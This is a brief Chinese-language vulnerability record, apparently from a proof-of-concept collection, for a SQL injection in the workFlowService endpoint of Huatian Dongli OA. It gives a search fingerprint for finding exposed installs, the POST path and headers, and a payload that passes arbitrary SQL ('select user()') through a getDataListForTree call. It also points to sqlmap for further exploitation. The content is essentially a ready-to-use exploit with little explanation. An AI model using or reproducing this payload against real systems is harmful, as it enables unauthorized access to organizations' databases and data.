# 华天动力OAworkFlowServiceSQL注入

- **系统**：华天动力OAworkFlowService　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="华天软件 OA"`
- **请求**：`POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`AAccept-Encoding: identity`　`Content-Length: 103`　`Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3`

**请求体 / payload**
```
<buffalo-call>
<method>getDataListForTree</method>
<string>select user()</string>
</buffalo-call>

sqlmap\
```

**其他**
- 华天动力OA workFlowService SQL注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 华天动力OA